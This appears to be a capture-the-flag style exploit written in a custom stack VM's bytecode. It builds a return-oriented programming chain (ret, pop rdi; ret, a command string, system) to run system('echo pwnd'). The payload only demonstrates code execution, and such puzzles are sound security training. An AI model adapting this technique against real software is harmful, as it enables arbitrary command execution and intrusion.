    SWAP 1      // ba
    PUSHP 0 0   // ba0
    SWAP 1      // b0a
    SUB         // b0
    DUP         // b00
    PUSHP 0 1   // b002
    ADD         // b02
    DUP         // b022
    PUSH 1      // b0221
    ADD         // b021
    SWAP 3      // 102b
    DUP         // 102bb
    DUP         // 102bbb
    SWAP 4      // 1b2bb0
    PUSHP 0 2   // 1b2bb03
    ADD         // 1b2bb3
    DUP SWAP 19 // 1b2bb3y
    SWAP 1      // 1b2bby3
    DUP SWAP 21 // 1b2bby3x
    SWAP 3      // 1b2bxy3b
                //  1b     2b             xy             3b
                // [ret], [pop rdi;ret], ["echo pwnd"], [system]
    END         // system("echo pwnd")